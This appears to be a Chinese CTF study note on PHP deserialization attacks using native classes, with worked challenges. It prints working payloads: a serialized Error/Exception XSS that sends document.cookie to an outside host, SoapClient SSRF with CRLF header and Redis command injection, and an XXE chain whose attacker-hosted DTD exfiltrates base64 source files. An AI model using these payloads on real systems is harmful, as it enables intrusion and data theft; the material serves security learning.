$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
?>
```

## 例题
![在这里插入图片描述](https://img-blog.csdnimg.cn/9af88a05627b44df9e9fd621ffdc72e0.png)

> 思路：对md5_file函数使用phar伪协议可以触发phar反序列化漏洞

根据题目，利用脚本构造phar文件：
![在这里插入图片描述](https://img-blog.csdnimg.cn/0536367942544bc5ac6a1c31b10814ed.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/45bda85bc2f749418d44d39cfc4f791f.png)
接着反序列化被触发，析构方法被触发，成功输出flag。


# php原生类


常遇到的几个 PHP 原生类有如下几个：

- Error
- Exception
- SoapClient
- DirectoryIterator
- SimpleXMLElement

下面我们根据这几个原生类的利用方式分别进行讲解。


## 使用 Error/Exception 内置类进行 XSS

### Error 内置类

- 适用于php7版本
- 在开启报错的情况下
Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 `__toString()` 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 `echo <Object>` 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString` 方法，这是一种挖洞的新思路。

下面演示如何使用 Error 内置类来构造 XSS。

测试代码：
```php
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）

给出POC：

```php
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>
```

//输出: 
`O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D`

### Exception 内置类

- 适用于php5、7版本
- 开启报错的情况下

测试代码：

```php
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

给出POC：
```php
<?php
$a = new Exception("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>
```
//输出: `O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D`
![[Pasted image 20251202232529.png]]


### [BJDCTF 2nd]xss之光

进入题目，首先通过git泄露拿到源码：

```php
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);

仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。

由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：

<?php
$poc = new Exception("<script>window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);</script>");
echo urlencode(serialize($poc));
?>
```

得到payload如下：

```
/?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```
执行后，得到flag就在 cookie 中：![[Pasted image 20251202233052.png]]

## 使用 Error/Exception 内置类绕过哈希比较

在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了

### Error 类

**Error** 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。

**类摘要：**
```
Error implements Throwable {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```
**类属性：**

- message：错误消息内容
- code：错误代码
- file：抛出错误的文件名
- line：抛出错误在该文件中的行数

**类方法：**

- [`Error::__construct`](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
- [`Error::getMessage`](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
- [`Error::getPrevious`](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
- [`Error::getCode`](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
- [`Error::getFile`](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
- [`Error::getLine`](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
- [`Error::getTrace`](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
- [`Error::getTraceAsString`](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
- [`Error::__toString`](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
- [`Error::__clone`](https://www.php.net/manual/zh/error.clone.php) — 克隆 error

### Exception 类

**Exception** 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。

**类摘要：**
```
Exception {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```
**类属性：**

- message：异常消息内容
- code：异常代码
- file：抛出异常的文件名
- line：抛出异常在该文件中的行号

**类方法：**

- [`Exception::__construct`](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
- [`Exception::getMessage`](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
- [`Exception::getPrevious`](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
- [`Exception::getCode`](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
- [`Exception::getFile`](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
- [`Exception::getLine`](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
- [`Exception::getTrace`](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
- [`Exception::getTraceAsString`](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
- [`Exception::__toString`](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
- [`Exception::__clone`](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆

我们可以看到，在Error和Exception这两个PHP原生类中内只有 `__toString` 方法，这个方法用于将异常或错误对象转换为字符串。


我们以Error为例，我们看看当触发他的 `__toString` 方法时会发生什么：

```php
<?php
$a = new Error("payload",1);
echo $a;

输出如下：

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

发现这将会以字符串的形式输出当前报错，包含当前的错误信息（"payload"）以及当前报错的行号（"2"），而传入 `Error("payload",1)` 中的错误代码“1”则没有输出出来。

在来看看下一个例子：
```php
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
```
```
输出如下：

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

```

可见，`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 `__toString` 返回的数据包含当前行号。

Exception 类与 Error 的使用和结果完全一样，只不过 `Exception` 类适用于PHP 5和7，而 `Error` 只适用于 PHP 7。

Error和Exception类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。


### [2020 极客大挑战]Greatphp

进入题目，给出源码：
```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```
可见，需要进入eval()执行代码需要先通过上面的if语句：

```
if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )
```
这个乍看一眼在ctf的基础题目中非常常见，一般情况下只需要使用数组即可绕过。但是这里是在类里面，我们当然不能这么做。

这里的考点是md5()和sha1()可以对一个类进行hash，并且会触发这个类的 `__toString` 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 `__toString` 方法。

所以我们可以使用含有 `__toString` 方法的PHP内置类来绕过，用的两个比较多的内置类就是 `Exception` 和 `Error` ，他们之中有一个 `__toString` 方法，当类被当做字符串处理时，就会调用这个函数。

根据刚才讲的Error类和Exception类中 `__toString` 方法的特性，我们可以用这两个内置类进行绕过。

由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 `include "/flag"` 将flag包含进来即可。由于过滤了引号，我们直接用url取反绕过即可。

POC如下：
```php
<?php

class SYCLOVER {
    public $syc;
    public $lover;
    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
/* 
或使用[~(取反)][!%FF]的形式，
即: $str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!.urldecode("%FF")."]?>";    

$str = "?><?=include $_GET[_]?>"; 
*/
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));

?>
```

这里 `$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";` 中为什么要在前面加上一个 `?>` 呢？因为 `Exception` 类与 `Error` 的 `__toString` 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：
```
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```
进入eval()函数会类似于：`eval("...Error: <?php payload ?>")`。所以我们要用 `?>` 来闭合一下，即 `eval("...Error: ?><?php payload ?>")`，这样我们的payload便能顺利执行了。

生成的payload如下：
`
`O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A19%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A19%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D`
`
执行便可得到flag



## 使用 SoapClient 类进行 SSRF

### SoapClient 类

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

类摘要如下：
```
SoapClient {
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = "" ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed
}
```
可以看到，该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call` 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。

该类的构造函数如下：

`public SoapClient :: SoapClient(mixed $wsdl [，array $options ])`

- 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。

#### **参数 2：`$options`**

- 类型：`array`
    
- 作用：**控制 SoapClient 的具体行为**
    
- 这里面的字段很多，下面是最重要最常见几个：
    

| 选项               | 作用                                | 是否真实访问          |
| ---------------- | --------------------------------- | --------------- |
| `uri`            | 设置 SOAP XML 里的**命名空间(namespace)** | ❌ 不访问，只是填在请求里   |
| `location`       | SOAP 请求发送的**真正目标 URL**            | ✅ 真实连接（SSRF 关键） |
| `user_agent`     | 自定义 HTTP 请求头 User-Agent           | ✅ 真实生效          |
| `soap_version`   | 选择 SOAP 版本（1.1 / 1.2）             | ✅ 影响发包结构        |
| `login`          | HTTP Basic 认证用户名                  | ✅ 真实发送          |
| `password`       | HTTP Basic 认证密码                   | ✅ 真实发送          |
| `stream_context` | 传入自定义请求上下文（可控制代理/超时等）             | ✅ 真实生效          |
| `trace`          | 记录 SOAP 请求/响应，调试用                 | 本地记录            |
| `exceptions`     | 决定错误是否抛异常                         | 影响本地逻辑          |
| `cache_wsdl`     | 是否缓存 WSDL                         | 如果是 WSDL 模式才有用  |
| `compression`    | 是否启用压缩                            | ✅ 影响 HTTP 传输    |
eg
```php
$options = [
  'uri'      => 'http://example.com',
  'location' => 'http://attacker.com/evil.php'
];
new SoapClient(null, $options);

```

### 使用 SoapClient 类进行 SSRF

知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。
```php
<?php
$a = new SoapClient(null,array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```


但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。

如下测试代码，我们在HTTP头中插入一个cookie：

```php
<?php
$target = 'http://47.xxx.xxx.72:2333/';
$a = new SoapClient(null,array('location' => $target, 'user_agent' => "WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4", 'uri' => 'test'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：
![[Pasted image 20251203002924.png]]
如下测试代码：
```php
<?php
$target = 'http://47.xxx.xxx.72:6379/';
$poc = "CONFIG SET dir /var/www/html";
$a = new SoapClient(null,array('location' => $target, 'uri' => 'hello^^'.$poc.'^^hello'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b); 
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

执行代码后，如下图所示，成功插入了Redis命令：![[Pasted image 20251203002940.png]]

这样我们就可以利用HTTP协议去攻击Redis了。

对于如何发送POST的数据包，这里面还有一个坑，就是 `Content-Type` 的设置，因为我们要提交的是POST数据 `Content-Type` 的值我们要设置为 `application/x-www-form-urlencoded`，这里如何修改 `Content-Type` 的值呢？由于 `Content-Type` 在 `User-Agent` 的下面，所以我们可以通过 `SoapClient` 来设置 `User-Agent` ，将原来的 `Content-Type` 挤下去，从而再插入一个新的 `Content-Type` 。

测试代码如下：

```php
<?php
$target = 'http://47.xxx.xxx.72:2333/';
$post_data = 'data=whoami';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
);
$a = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

执行代码后，如下图所示，成功发送POST数据：

### bestphp's revenge

bestphp's revenge 这道题利用的就是这个点，即对 SoapClient 类进行反序列化触发 SSRF，并配合CRLF构造payload。

进入题目，给出源码：![[Pasted image 20251203003231.png]]

扫描目录发现flag.php：![[Pasted image 20251203003952.png]]

可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。

但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。

写出最后的POC：

```php
<?php
$target = "http://127.0.0.1/flag.php";
$attack = new SoapClient(null,array('location' => $target,
    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",
    'uri' => "123"));
$payload = urlencode(serialize($attack));
echo $payload;
```

生成payload：
`
O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D`

这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为 `PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4` 的session中。

然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有 `ini_set()` 这个函数来更改 `session.serialize_handler` 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造 `session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的 `call_user_func($_GET['f'], $_POST);` 函数，传入GET：/?f=session_start、POST：serialize_handler=php_serialize，实现 `session_start(serialize_handler=php_serialize)` 的调用来修改此页面的序列化引擎为php_serialize。

所以，我们第一次传值先注入上面POC生成的payload创建并得到我们的session：



## 文件操作

**ZipArchive 类删除文件**

> 是不是很神奇, 这个能把文件删除了!

在 `ZipArchive` 中存在 `open` 方法, 参数为 `(string $filename, int $flags=0)`, 第一个为文件名, 第二个为打开的模式, 有以下几种模式
```
ZipArchive::OVERWRITE    总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除
ZipArchive::CREATE        如果不存在则创建一个zip压缩包
ZipArchive::RDONLY        只读模式打开压缩包
ZipArchive::EXCL        如果压缩包已经存在，则出错
ZipArchive::CHECKCONS    对压缩包执行额外的一致性检查，如果失败则显示错误
```

我们可以发现当 `flag` 为 `override` (8) 时, 会将目标文件先进行删除, 之后由于并没有进行保存操作, 于是文件就被删除了

在 `ByteCTF 2019 - EZCMS` 中有出现过

**SQLite3 类创建文件**

可以利用此创建本地数据库的能力来创建一个文件

**DirectoryIterator / FilesystemIterator 列出文件**

这两个类在进行 `toString` 操作后会返回当前目录中的第一个文件

还有一个特殊的 `GlobIterator`, 不需要 `glob://` 就可以遍历目录

**SplFileObject 读取文件**

该方法不支持通配符并且只能获取都爱第一行, 但是当走投无路的时候也不失为一种方法

这几个文件读取类在 2023 第六届安洵杯网络安全挑战赛 - easy_unserialize 出现过, 文末有相关题目

**闭包 (Closure)**

闭包在 PHP 5.3 版本中被引入来代表匿名函数, 直接将其作为函数来调用. 但是会收到 PHP 的安全限制而无法反序列化.

当然, 我们可能会发现一些第三方的 `Closure` 库并没有没安全限制, 利用这些来反序列化也异曲同工.

**Reflection系列 反射**

> 可以参考 PHP 手册: [https://www.php.net/manual/en/book.reflection.php](https://www.php.net/manual/en/book.reflection.php)

反射可以让你获取到指定类,函数等的代码, 可以利用其进行输出

**SimpleXMLElement XML 读取**

可以把这个和 XXE 结合起来实现文件读取

## 使用 DirectoryIterator 类绕过 open_basedir

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。

DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。

测试代码：
```
// test.php
<?php
$dir = $_GET['whoami'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

### payload一句话的形式:
`$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}`

我们输入 `/?whoami=glob:///*` 即可列出根目录下的文件：



![[Pasted image 20251204101900.png]]
但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。

# 使用 SimpleXMLElement 类进行 XXE

SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。

### SimpleXMLElement

官方文档中对于SimpleXMLElement 类的构造方法 `SimpleXMLElement::__construct` 的定义如下：
![[Pasted image 20251204102521.png]]
![[Pasted image 20251204102526.png]]
可以看到通过设置第三个参数 data_is_url 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。

这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。


首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。

evil.xml：
```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % remote SYSTEM "http://47.xxx.xxx.72/send.xml">
%remote;
%all;
%send;
]>
```
send.xml：
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://47.xxx.xxx.72/send.php?file=%file;'>">
```
send.php：

```
<?php 
file_put_contents("result.txt", $_GET['file']) ;
?>
```
然后在url中构造如下：
```
/show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true
```
这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。

如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：







































